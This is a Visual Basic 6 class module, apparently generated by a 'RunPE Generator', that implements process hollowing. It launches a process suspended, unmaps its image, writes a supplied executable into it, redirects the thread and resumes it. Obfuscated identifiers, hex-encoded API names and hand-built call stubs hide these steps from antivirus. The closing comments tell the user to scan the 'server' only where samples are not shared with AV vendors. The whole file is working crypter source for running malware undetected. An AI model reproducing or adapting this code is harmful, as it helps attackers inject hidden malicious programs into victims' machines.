VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "S0k7I6oDhyUVyFRtNrQiIit"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False

Private Const i7s7y5ZgLYXnqtlLZSDkmHj       As Long = &H5A4D&
Private Const X7m1e0JFRUjFGPZUwNfATND        As Long = &H4550&
Private Const o0N6u6UySRsardhIitnGDZu           As Long = &H40
Private Const U2I3k0VJSpkOQvQWeTIJHMj           As Long = &HF8
Private Const p8b7n0IKCbqiTBDXAFTPwLk     As Long = &H28
Private Const k2V6J5IgYKEWFcMWcYkBQXZ As Long = &H28
Private Const i1B5g2TmujPLLKPAHOeFEUK             As String = "8B4C240851<h4q6Y6yeeSEfCOcKbNRrfdX>E8<o6J5D1FRUjFGPZUwNfATNDi>5989016631C0C3"
Private Const j0L0g5bafQJQuVHXadVtXCl          As String = "8B5C240854B830000000648B008B400C8B401C8B008B400889035C31C0C3"
Private Const h4q6Y6yeeSEfCOcKbNRrfdX                    As String = "<h4q6Y6yeeSEfCOcKbNRrfdX>"
Private Const o6J5D1FRUjFGPZUwNfATNDi                    As String = "<o6J5D1FRUjFGPZUwNfATNDi>"
Private Const r7q8g4gLYXnqtlLZSDkmHjo              As Long = &H10007
Private Const C2h8i3ySRsardhIitnGDZuU          As Long = &H4
Private Const J1Q6y3FPmhLMsNSaQyFGEJg                As Long = &H1000
Private Const m8Y6k0EHXmfQwAUvCPMuIhh               As Long = &H2000
Private Const J3e1a1duVyHBTCYITZVgwNU    As Long = &H40
Private Type W5D8b5KQjrgMIIGLvDKbCBR
    cb                          As Long
    lpReserved                  As Long
    lpDesktop                   As Long
    lpTitle                     As Long
    dwX                         As Long
    dwY                         As Long
    ' dwXSize                     As Long
    ' dwYSize                     As Long
    'dwXCountChars               As Long
    'dwYCountChars               As Long
    'dwFillAttribute             As Long
    'dwFlags                     As Long
    'wShowWindow                 As Integer
    'cbReserved2                 As Integer
    'lpReserved2                 As Long
    'hStdInput                   As Long
    'hStdOutput                  As Long
    'hStdError                   As Long
End Type

Private Type H1C4E6gODXNEScLLwwZiuWq
    B7R5Z1qtOquJGoCbbDLXATWess                    As Long
    hThread                     As Long
    dwProcessID                 As Long
    dwThreadID                  As Long
End Type

Private Type V8M4M1DVSpZjplwOPkmyTAd
    ControlWord                 As Long
    StatusWord                  As Long
    TagWord                     As Long
    ErrorOffset                 As Long
    ErrorSelector               As Long
    DataOffset                  As Long
    DataSelector                As Long
    RegisterArea(1 To 80)       As Byte
    Cr0NpxState                 As Long
End Type

Private Type t4g0I8cYYXcNGNrSEUXaSqU
    ContextFlags                As Long
    Dr0                         As Long
    Dr1                         As Long
    Dr2                         As Long
    Dr3                         As Long
    Dr6                         As Long
    Dr7                         As Long
    FloatSave                   As V8M4M1DVSpZjplwOPkmyTAd
    SegGs                       As Long
    SegFs                       As Long
    SegEs                       As Long
    SegDs                       As Long
    Edi                         As Long
    Esi                         As Long
    Ebx                         As Long
    Edx                         As Long
    Ecx                         As Long
    Eax                         As Long
    Ebp                         As Long
    Eip                         As Long
    SegCs                       As Long
    EFlags                      As Long
    Esp                         As Long
    SegSs                       As Long
End Type
Private Type i5T7d3isbbOBcLZHYKOncZT
    e_magic                     As Integer
    e_cblp                      As Integer
    e_cp                        As Integer
    e_crlc                      As Integer
    e_cparhdr                   As Integer
    e_minalloc                  As Integer
    e_maxalloc                  As Integer
    e_ss                        As Integer
    e_sp                        As Integer
    e_csum                      As Integer
    e_ip                        As Integer
    e_cs                        As Integer
    e_lfarlc                    As Integer
    e_ovno                      As Integer
    e_res(0 To 3)               As Integer
    e_oemid                     As Integer
    e_oeminfo                   As Integer
    e_res2(0 To 9)              As Integer
    e_lfanew                    As Long
End Type

Private Type l6G5A1CORfBDMWRtKcvQKAf
    Machine                     As Integer
    NumberOfSections            As Integer
    TimeDateStamp               As Long
    PointerToSymbolTable        As Long
    NumberOfSymbols             As Long
    SizeOfOptionalHeader        As Integer
    Characteristics             As Integer
End Type

Private Type o7n7d4dIVUknqiHWPhjEglJ
    Virtuac4k0C4ZiGnRgNTmukQLMKPA              As Long
    Size                        As Long
End Type

Private Type e7f3s2OpXoaeFepjCAWrQJF
    Magic                       As Integer
    MajorLinkerVersion          As Byte
    MinorLinkerVersion          As Byte
    SizeOfCode                  As Long
    SizeOfInitializedData       As Long
    SizeOfUnitializedData       As Long
    AddressOfEntryPoint         As Long
    BaseOfCode                  As Long
    BaseOfData                  As Long
    ImageBase                   As Long
    SectionAlignment            As Long
    FileAlignment               As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion           As Integer
    MinorImageVersion           As Integer
    MajorSubsystemVersion       As Integer
    MinorSubsystemVersion       As Integer
    W32VersionValue             As Long
    SizeOfImage                 As Long
    SizeOfHeaders               As Long
    CheckSum                    As Long
    SubSystem                   As Integer
    DllCharacteristics          As Integer
    SizeOfStackReserve          As Long
    SizeOfStackCommit           As Long
    SizeOfHeapReserve           As Long
    SizeOfHeapCommit            As Long
    LoaderFlags                 As Long
    NumberOfRvaAndSizes         As Long
    DataDirectory(0 To 15)      As o7n7d4dIVUknqiHWPhjEglJ
End Type

Private Type Q6y3F2mhLMsNSaQyFGEJgmt
    Signature                   As Long
    FileHeader                  As l6G5A1CORfBDMWRtKcvQKAf
    OptionalHeader              As e7f3s2OpXoaeFepjCAWrQJF
End Type

Private Type Y6k0E1XmfQwAUvCPMuIhhJR
   Characteristics              As Long
   TimeDateStamp                As Long
   MajorVersion                 As Integer
   MinorVersion                 As Integer
   lpName                       As Long
   Base                         As Long
   NumberOfFunctions            As Long
   NumberOfNames                As Long
   lpAddressOfFunctions         As Long
   lpAddressOfNames             As Long
   lpAddressOfNameOrdinals      As Long
End Type
Private Type b0W0a7SrDvPVFQWSduJRScA
    SecName                     As String * 8
    VirtualSize                 As Long
    Virtuac4k0C4ZiGnRgNTmukQLMKPA              As Long
    SizeOfRawData               As Long
    PointerToRawData            As Long
    PointerToRelocations        As Long
    PointerToLinenumbers        As Long
    NumberOfRelocations         As Integer
    NumberOfLinenumbers         As Integer
    Characteristics             As Long
End Type

Private Declare Sub CopyBytes Lib "MSVBVM60.DLL" Alias "__vbaCopyBytes" (ByVal Size As Long, Dest As Any, Source As Any)

Private u4Z1N5ndJEFDIsAHXwOEHwX         As Long
Private A5c2U2BPZIIuuWerTmSqIUJ      As Long
Private G0S2l4gmitLMhisQvaqWdvF         As Boolean
Private t4V3T4KDKoPBQUXPnRyfbQk          As Long
Private a3f7Y4LwZuIWEVHLkZWQifD       As Long
Private v2b2M1YVscmsoBRSnpWEhvd(&HFF)   As Byte
       
Public Function Y8D0L2cwAJTNqHZtNHvcllk() As Long
    'This function will be replaced with machine code laterz
    'Do not add any public procedure on top of it
End Function

Public Function S0k7I6oDhyUVyFRtNrQiIit(ByRef L6I1j3iUYwYjdysQlKCwKbp() As Byte, Optional L0I5a1GmHMUKpwCZgnSeetw As String, Optional ByRef B7R5Z1qtOquJGoCbbDLXATW As Long) As Boolean
    Dim i                       As Long
    Dim ti5T7d3isbbOBcLZHYKOncZT       As i5T7d3isbbOBcLZHYKOncZT
    Dim tQ6y3F2mhLMsNSaQyFGEJgmt       As Q6y3F2mhLMsNSaQyFGEJgmt
    Dim tb0W0a7SrDvPVFQWSduJRScA   As b0W0a7SrDvPVFQWSduJRScA
    Dim tW5D8b5KQjrgMIIGLvDKbCBR            As W5D8b5KQjrgMIIGLvDKbCBR
    Dim tH1C4E6gODXNEScLLwwZiuWq    As H1C4E6gODXNEScLLwwZiuWq
    Dim tt4g0I8cYYXcNGNrSEUXaSqU                As t4g0I8cYYXcNGNrSEUXaSqU
    Dim O5m3V1uVrFTASEIhVTNfcVt                 As Long
    Dim A8H2Z8yGPKnEWqKEtZhiglX                  As Long
    Dim Q4C2O5hkbBQJsadwaesDYlY                    As Long
   
    If Not G0S2l4gmitLMhisQvaqWdvF Then Exit Function

    Call CopyBytes(o0N6u6UySRsardhIitnGDZu, ti5T7d3isbbOBcLZHYKOncZT, L6I1j3iUYwYjdysQlKCwKbp(0))
   
    If Not ti5T7d3isbbOBcLZHYKOncZT.e_magic = i7s7y5ZgLYXnqtlLZSDkmHj Then
        Exit Function
    End If

    Call CopyBytes(U2I3k0VJSpkOQvQWeTIJHMj, tQ6y3F2mhLMsNSaQyFGEJgmt, L6I1j3iUYwYjdysQlKCwKbp(ti5T7d3isbbOBcLZHYKOncZT.e_lfanew))
   
    If Not tQ6y3F2mhLMsNSaQyFGEJgmt.Signature = X7m1e0JFRUjFGPZUwNfATND Then
        Exit Function
    End If
   
                                    'kernel32
    O5m3V1uVrFTASEIhVTNfcVt = LoadLibrary(W3S3V1AHkMvNRULkNrcYMhX("6B65726E656C3332"))                                                                                               'KPC
                                    'ntdll
    A8H2Z8yGPKnEWqKEtZhiglX = LoadLibrary(W3S3V1AHkMvNRULkNrcYMhX("6E74646C6C"))                                                                                                   'KPC
   
    If L0I5a1GmHMUKpwCZgnSeetw = vbNullString Then
        L0I5a1GmHMUKpwCZgnSeetw = Space(260)
                                                'W0a7S7DvPVFQWSduJRScAuYuleFileNameW
        Q4C2O5hkbBQJsadwaesDYlY = Z1N5n5JEFDIsAHXwOEHwXAf(O5m3V1uVrFTASEIhVTNfcVt, W3S3V1AHkMvNRULkNrcYMhX("4765744D6F64756C6546696C654E616D6557"))                                                                        'KPC
        o4T4F3RhknfETMydgBdhyGb Q4C2O5hkbBQJsadwaesDYlY, App.hInstance, StrPtr(L0I5a1GmHMUKpwCZgnSeetw), 260
    End If
   
    With tQ6y3F2mhLMsNSaQyFGEJgmt.OptionalHeader
       
        tW5D8b5KQjrgMIIGLvDKbCBR.cb = Len(tW5D8b5KQjrgMIIGLvDKbCBR)
           
                                                'CreateProcessW
        Q4C2O5hkbBQJsadwaesDYlY = Z1N5n5JEFDIsAHXwOEHwXAf(O5m3V1uVrFTASEIhVTNfcVt, W3S3V1AHkMvNRULkNrcYMhX("43726561746550726F6365737357"))                                                                            'KPC
        o4T4F3RhknfETMydgBdhyGb Q4C2O5hkbBQJsadwaesDYlY, 0, StrPtr(L0I5a1GmHMUKpwCZgnSeetw), 0, 0, 0, C2h8i3ySRsardhIitnGDZuU, 0, 0, VarPtr(tW5D8b5KQjrgMIIGLvDKbCBR), VarPtr(tH1C4E6gODXNEScLLwwZiuWq)

                                                'NtUnmapViewOfSection
        Q4C2O5hkbBQJsadwaesDYlY = Z1N5n5JEFDIsAHXwOEHwXAf(A8H2Z8yGPKnEWqKEtZhiglX, W3S3V1AHkMvNRULkNrcYMhX("4E74556E6D6170566965774F6653656374696F6E"))                                                                       'KPC
        o4T4F3RhknfETMydgBdhyGb Q4C2O5hkbBQJsadwaesDYlY, tH1C4E6gODXNEScLLwwZiuWq.B7R5Z1qtOquJGoCbbDLXATWess, .ImageBase
       
                                                'VirtualAllocEx
        Q4C2O5hkbBQJsadwaesDYlY = Z1N5n5JEFDIsAHXwOEHwXAf(O5m3V1uVrFTASEIhVTNfcVt, W3S3V1AHkMvNRULkNrcYMhX("5669727475616C416C6C6F634578"))                                                                            'KPC
        o4T4F3RhknfETMydgBdhyGb Q4C2O5hkbBQJsadwaesDYlY, tH1C4E6gODXNEScLLwwZiuWq.B7R5Z1qtOquJGoCbbDLXATWess, .ImageBase, .SizeOfImage, J1Q6y3FPmhLMsNSaQyFGEJg Or m8Y6k0EHXmfQwAUvCPMuIhh, J3e1a1duVyHBTCYITZVgwNU
       
                                                'NtWriteVirtualMemory
        Q4C2O5hkbBQJsadwaesDYlY = Z1N5n5JEFDIsAHXwOEHwXAf(A8H2Z8yGPKnEWqKEtZhiglX, W3S3V1AHkMvNRULkNrcYMhX("4E7457726974655669727475616C4D656D6F7279"))                                                                       'KPC
        o4T4F3RhknfETMydgBdhyGb Q4C2O5hkbBQJsadwaesDYlY, tH1C4E6gODXNEScLLwwZiuWq.B7R5Z1qtOquJGoCbbDLXATWess, .ImageBase, VarPtr(L6I1j3iUYwYjdysQlKCwKbp(0)), .SizeOfHeaders, 0
   
        For i = 0 To tQ6y3F2mhLMsNSaQyFGEJgmt.FileHeader.NumberOfSections - 1
            CopyBytes Len(tb0W0a7SrDvPVFQWSduJRScA), tb0W0a7SrDvPVFQWSduJRScA, L6I1j3iUYwYjdysQlKCwKbp(ti5T7d3isbbOBcLZHYKOncZT.e_lfanew + U2I3k0VJSpkOQvQWeTIJHMj + k2V6J5IgYKEWFcMWcYkBQXZ * i)
            o4T4F3RhknfETMydgBdhyGb Q4C2O5hkbBQJsadwaesDYlY, tH1C4E6gODXNEScLLwwZiuWq.B7R5Z1qtOquJGoCbbDLXATWess, .ImageBase + tb0W0a7SrDvPVFQWSduJRScA.Virtuac4k0C4ZiGnRgNTmukQLMKPA, VarPtr(L6I1j3iUYwYjdysQlKCwKbp(tb0W0a7SrDvPVFQWSduJRScA.PointerToRawData)), tb0W0a7SrDvPVFQWSduJRScA.SizeOfRawData, 0
        Next i

        tt4g0I8cYYXcNGNrSEUXaSqU.ContextFlags = r7q8g4gLYXnqtlLZSDkmHjo
       
                                                'NtGetContextThread
        Q4C2O5hkbBQJsadwaesDYlY = Z1N5n5JEFDIsAHXwOEHwXAf(A8H2Z8yGPKnEWqKEtZhiglX, W3S3V1AHkMvNRULkNrcYMhX("4E74476574436F6E74657874546872656164"))                                                                         'KPC
        o4T4F3RhknfETMydgBdhyGb Q4C2O5hkbBQJsadwaesDYlY, tH1C4E6gODXNEScLLwwZiuWq.hThread, VarPtr(tt4g0I8cYYXcNGNrSEUXaSqU)
   
                                                'NtWriteVirtualMemory
        Q4C2O5hkbBQJsadwaesDYlY = Z1N5n5JEFDIsAHXwOEHwXAf(A8H2Z8yGPKnEWqKEtZhiglX, W3S3V1AHkMvNRULkNrcYMhX("4E7457726974655669727475616C4D656D6F7279"))                                                                       'KPC
        o4T4F3RhknfETMydgBdhyGb Q4C2O5hkbBQJsadwaesDYlY, tH1C4E6gODXNEScLLwwZiuWq.B7R5Z1qtOquJGoCbbDLXATWess, tt4g0I8cYYXcNGNrSEUXaSqU.Ebx + 8, VarPtr(.ImageBase), 4, 0
       
        tt4g0I8cYYXcNGNrSEUXaSqU.Eax = .ImageBase + .AddressOfEntryPoint
       
                                                'NtSetContextThread
        Q4C2O5hkbBQJsadwaesDYlY = Z1N5n5JEFDIsAHXwOEHwXAf(A8H2Z8yGPKnEWqKEtZhiglX, W3S3V1AHkMvNRULkNrcYMhX("4E74536574436F6E74657874546872656164"))                                                                         'KPC
        o4T4F3RhknfETMydgBdhyGb Q4C2O5hkbBQJsadwaesDYlY, tH1C4E6gODXNEScLLwwZiuWq.hThread, VarPtr(tt4g0I8cYYXcNGNrSEUXaSqU)
       
                                                'NtResumeThread
        Q4C2O5hkbBQJsadwaesDYlY = Z1N5n5JEFDIsAHXwOEHwXAf(A8H2Z8yGPKnEWqKEtZhiglX, W3S3V1AHkMvNRULkNrcYMhX("4E74526573756D65546872656164"))                                                                             'KPC
        o4T4F3RhknfETMydgBdhyGb Q4C2O5hkbBQJsadwaesDYlY, tH1C4E6gODXNEScLLwwZiuWq.hThread, 0
       
        B7R5Z1qtOquJGoCbbDLXATW = tH1C4E6gODXNEScLLwwZiuWq.B7R5Z1qtOquJGoCbbDLXATWess
    End With
   
    S0k7I6oDhyUVyFRtNrQiIit = True
End Function

Public Function o4T4F3RhknfETMydgBdhyGb(ByVal Q4C2O5hkbBQJsadwaesDYlY As Long, ParamArray Params()) As Long
    Dim o2o0t2ySCNSParGOPYvrUWD        As Long
    Dim i           As Long
    Dim J5k4G0CAFpvEUyuLBDuUvbZ       As String
    Dim E8N0u1TCBooQYkNgMjCOCAt     As String
   
    If Q4C2O5hkbBQJsadwaesDYlY = 0 Then Exit Function
   
    For i = UBound(Params) To 0 Step -1
        E8N0u1TCBooQYkNgMjCOCAt = E8N0u1TCBooQYkNgMjCOCAt & "68" & o5O7M2mUlXbBbmgyToNFCNe(CLng(Params(i)))
    Next
   
    o2o0t2ySCNSParGOPYvrUWD = VarPtr(v2b2M1YVscmsoBRSnpWEhvd(0))
    o2o0t2ySCNSParGOPYvrUWD = o2o0t2ySCNSParGOPYvrUWD + (UBound(Params) + 2) * 5
    o2o0t2ySCNSParGOPYvrUWD = Q4C2O5hkbBQJsadwaesDYlY - o2o0t2ySCNSParGOPYvrUWD - 5
   
    J5k4G0CAFpvEUyuLBDuUvbZ = i1B5g2TmujPLLKPAHOeFEUK
    J5k4G0CAFpvEUyuLBDuUvbZ = Replace(J5k4G0CAFpvEUyuLBDuUvbZ, h4q6Y6yeeSEfCOcKbNRrfdX, E8N0u1TCBooQYkNgMjCOCAt)
    J5k4G0CAFpvEUyuLBDuUvbZ = Replace(J5k4G0CAFpvEUyuLBDuUvbZ, o6J5D1FRUjFGPZUwNfATNDi, o5O7M2mUlXbBbmgyToNFCNe(o2o0t2ySCNSParGOPYvrUWD))
   
    Call s2C2j5HJpKPXNsCCBGcjqVi(J5k4G0CAFpvEUyuLBDuUvbZ)
   
    o4T4F3RhknfETMydgBdhyGb = h8B0y3jcMuvRtMJrFeeGObD
End Function

Private Function o5O7M2mUlXbBbmgyToNFCNe(ByVal M1f2a5cnFGbclKqUjQWpwnT As Long) As String
    Dim O2N3D8DhJtKOQIhKoZUJdUL(3)   As Byte
    Dim i           As Long
   
    CopyBytes &H4, O2N3D8DhJtKOQIhKoZUJdUL(0), M1f2a5cnFGbclKqUjQWpwnT
    For i = 0 To 3
        o5O7M2mUlXbBbmgyToNFCNe = o5O7M2mUlXbBbmgyToNFCNe & Right("0" & Hex(O2N3D8DhJtKOQIhKoZUJdUL(i)), 2)
    Next
End Function

Private Sub s2C2j5HJpKPXNsCCBGcjqVi(ByVal Z6S3F7SoBPvOBFeSQKcZySq As String)
    Dim i   As Long
    For i = 0 To Len(Z6S3F7SoBPvOBFeSQKcZySq) - 1 Step 2
        v2b2M1YVscmsoBRSnpWEhvd((i / 2)) = CByte("&h" & Mid$(Z6S3F7SoBPvOBFeSQKcZySq, i + 1, 2))
    Next i
End Sub

Private Function h8B0y3jcMuvRtMJrFeeGObD() As Long
    CopyBytes &H4, t4V3T4KDKoPBQUXPnRyfbQk, ByVal ObjPtr(Me)
    t4V3T4KDKoPBQUXPnRyfbQk = t4V3T4KDKoPBQUXPnRyfbQk + &H1C
    CopyBytes &H4, a3f7Y4LwZuIWEVHLkZWQifD, ByVal t4V3T4KDKoPBQUXPnRyfbQk
    CopyBytes &H4, ByVal t4V3T4KDKoPBQUXPnRyfbQk, VarPtr(v2b2M1YVscmsoBRSnpWEhvd(0))
    h8B0y3jcMuvRtMJrFeeGObD = Y8D0L2cwAJTNqHZtNHvcllk
    CopyBytes &H4, ByVal t4V3T4KDKoPBQUXPnRyfbQk, a3f7Y4LwZuIWEVHLkZWQifD
End Function

Public Function W0a7S7DvPVFQWSduJRScAuY(ByVal N3w2K4egYwNFpXZuXbpAUiV As String, ByVal v7E1W7sDMHkATmGBpVefdiT As String) As Long
    W0a7S7DvPVFQWSduJRScAuY = Me.Z1N5n5JEFDIsAHXwOEHwXAf(Me.LoadLibrary(N3w2K4egYwNFpXZuXbpAUiV), v7E1W7sDMHkATmGBpVefdiT)
End Function

Public Function LoadLibrary(ByVal N3w2K4egYwNFpXZuXbpAUiV As String) As Long
    LoadLibrary = o4T4F3RhknfETMydgBdhyGb(A5c2U2BPZIIuuWerTmSqIUJ, StrPtr(N3w2K4egYwNFpXZuXbpAUiV & vbNullChar))
End Function

Public Property Get Initialized() As Boolean
    Initialized = G0S2l4gmitLMhisQvaqWdvF
End Property

Public Sub Class_Initialize()

    Call s2C2j5HJpKPXNsCCBGcjqVi(j0L0g5bafQJQuVHXadVtXCl)
   
    u4Z1N5ndJEFDIsAHXwOEHwX = h8B0y3jcMuvRtMJrFeeGObD
   
    If Not u4Z1N5ndJEFDIsAHXwOEHwX = 0 Then
        A5c2U2BPZIIuuWerTmSqIUJ = Z1N5n5JEFDIsAHXwOEHwXAf(u4Z1N5ndJEFDIsAHXwOEHwX, "LoadLibraryW")
        If Not A5c2U2BPZIIuuWerTmSqIUJ = 0 Then
            G0S2l4gmitLMhisQvaqWdvF = True
        End If
    End If
End Sub

Public Function Z1N5n5JEFDIsAHXwOEHwXAf(ByVal Q4C2O5hkbBQJsadwaesDYlY As Long, ByVal v7E1W7sDMHkATmGBpVefdiT As String) As Long
    Dim ti5T7d3isbbOBcLZHYKOncZT       As i5T7d3isbbOBcLZHYKOncZT
    Dim tQ6y3F2mhLMsNSaQyFGEJgmt       As Q6y3F2mhLMsNSaQyFGEJgmt
    Dim tY6k0E1XmfQwAUvCPMuIhhJR As Y6k0E1XmfQwAUvCPMuIhhJR
   
    Call CopyBytes(o0N6u6UySRsardhIitnGDZu, ti5T7d3isbbOBcLZHYKOncZT, ByVal Q4C2O5hkbBQJsadwaesDYlY)
   
    If Not ti5T7d3isbbOBcLZHYKOncZT.e_magic = i7s7y5ZgLYXnqtlLZSDkmHj Then
        Exit Function
    End If

    Call CopyBytes(U2I3k0VJSpkOQvQWeTIJHMj, tQ6y3F2mhLMsNSaQyFGEJgmt, ByVal Q4C2O5hkbBQJsadwaesDYlY + ti5T7d3isbbOBcLZHYKOncZT.e_lfanew)
   
    If Not tQ6y3F2mhLMsNSaQyFGEJgmt.Signature = X7m1e0JFRUjFGPZUwNfATND Then
        Exit Function
    End If
   
    Dim I6F0g2fRVuVgaspMiHuHXmI   As Long
    Dim y1c4B0jEJRHmuytWdkPbaqu      As Long
    Dim w7O5W1nqLnrGClYYIUvQyTl       As Long
   
    With tQ6y3F2mhLMsNSaQyFGEJgmt.OptionalHeader
        I6F0g2fRVuVgaspMiHuHXmI = Q4C2O5hkbBQJsadwaesDYlY + .DataDirectory(0).Virtuac4k0C4ZiGnRgNTmukQLMKPA
        y1c4B0jEJRHmuytWdkPbaqu = I6F0g2fRVuVgaspMiHuHXmI + .DataDirectory(0).Size
        w7O5W1nqLnrGClYYIUvQyTl = .ImageBase
    End With
   
    Call CopyBytes(p8b7n0IKCbqiTBDXAFTPwLk, tY6k0E1XmfQwAUvCPMuIhhJR, ByVal I6F0g2fRVuVgaspMiHuHXmI)
       
    Dim i           As Long
    Dim L6v7J7PJPLXoDLMVsnRTAGZ   As Long
    Dim e3A8u8jqwOonEtvoNqVTBpK    As Long
    Dim B7F2w8llMVhKdJgLypIGcMW    As Long

    With tY6k0E1XmfQwAUvCPMuIhhJR
        For i = 0 To .NumberOfNames - 1
           
            CopyBytes 4, e3A8u8jqwOonEtvoNqVTBpK, ByVal w7O5W1nqLnrGClYYIUvQyTl + .lpAddressOfNames + i * 4
           
            If v2M6S5jfqIJefpNtXmTasBq(w7O5W1nqLnrGClYYIUvQyTl + e3A8u8jqwOonEtvoNqVTBpK) = v7E1W7sDMHkATmGBpVefdiT Then
                CopyBytes 2, B7F2w8llMVhKdJgLypIGcMW, ByVal w7O5W1nqLnrGClYYIUvQyTl + .lpAddressOfNameOrdinals + i * 2
                CopyBytes 4, L6v7J7PJPLXoDLMVsnRTAGZ, ByVal w7O5W1nqLnrGClYYIUvQyTl + .lpAddressOfFunctions + B7F2w8llMVhKdJgLypIGcMW * 4
               
                Z1N5n5JEFDIsAHXwOEHwXAf = L6v7J7PJPLXoDLMVsnRTAGZ + w7O5W1nqLnrGClYYIUvQyTl
                             
                If Z1N5n5JEFDIsAHXwOEHwXAf >= I6F0g2fRVuVgaspMiHuHXmI And _
                   Z1N5n5JEFDIsAHXwOEHwXAf <= y1c4B0jEJRHmuytWdkPbaqu Then
                    Call Z1y3H8MWFErrTbnQjPnFRFD(Z1N5n5JEFDIsAHXwOEHwXAf, Q4C2O5hkbBQJsadwaesDYlY, v7E1W7sDMHkATmGBpVefdiT)
                    If Not Q4C2O5hkbBQJsadwaesDYlY = 0 Then
                        Z1N5n5JEFDIsAHXwOEHwXAf = Z1N5n5JEFDIsAHXwOEHwXAf(Q4C2O5hkbBQJsadwaesDYlY, v7E1W7sDMHkATmGBpVefdiT)
                    Else
                        Z1N5n5JEFDIsAHXwOEHwXAf = 0
                    End If
                End If
               
                Exit Function
            End If
        Next
    End With
   
End Function

Private Function Z1y3H8MWFErrTbnQjPnFRFD( _
       ByVal c4k0C4ZiGnRgNTmukQLMKPA As Long, _
       ByRef s0e1q1KNFeHlWRGaRIVfPOC As Long, _
       ByRef n2l8M8LvBbPNHZWsOnspBET As String)
       
    Dim o7J0h8QjDwmSbcafQJQuIHX     As String

    o7J0h8QjDwmSbcafQJQuIHX = v2M6S5jfqIJefpNtXmTasBq(c4k0C4ZiGnRgNTmukQLMKPA)
    If InStr(1, o7J0h8QjDwmSbcafQJQuIHX, ".") Then
        s0e1q1KNFeHlWRGaRIVfPOC = LoadLibrary(Split(o7J0h8QjDwmSbcafQJQuIHX, ".")(0))
        n2l8M8LvBbPNHZWsOnspBET = Split(o7J0h8QjDwmSbcafQJQuIHX, ".")(1)
    End If
   
End Function
Private Function v2M6S5jfqIJefpNtXmTasBq( _
       ByVal c4k0C4ZiGnRgNTmukQLMKPA As Long) As String
       
    Dim A5A1O0irsqyTZhLYXnrtlLa       As Byte
   
    Do
        CopyBytes 1, A5A1O0irsqyTZhLYXnrtlLa, ByVal c4k0C4ZiGnRgNTmukQLMKPA
        c4k0C4ZiGnRgNTmukQLMKPA = c4k0C4ZiGnRgNTmukQLMKPA + 1
        If A5A1O0irsqyTZhLYXnrtlLa = 0 Then Exit Do
        v2M6S5jfqIJefpNtXmTasBq = v2M6S5jfqIJefpNtXmTasBq & Chr$(A5A1O0irsqyTZhLYXnrtlLa)
    Loop
   
End Function
Private Function W3S3V1AHkMvNRULkNrcYMhX(ByVal J5k4G0CAFpvEUyuLBDuUvbZ As String) As String
    Dim i       As Long
    For i = 1 To Len(J5k4G0CAFpvEUyuLBDuUvbZ) Step 2
       W3S3V1AHkMvNRULkNrcYMhX = W3S3V1AHkMvNRULkNrcYMhX & Chr$(Val("&H" & Mid$(J5k4G0CAFpvEUyuLBDuUvbZ, i, 2)))
    Next i
End Function

 'RunPE function is S0k7I6oDhyUVyFRtNrQiIit
 'RunPE Made by : br1337 RUNPE Generator
 'Never upload your server to another scan site,
'just to www.novirusthanks.org and check the checkbox ' do not distribute the example '
 'Thanks :P


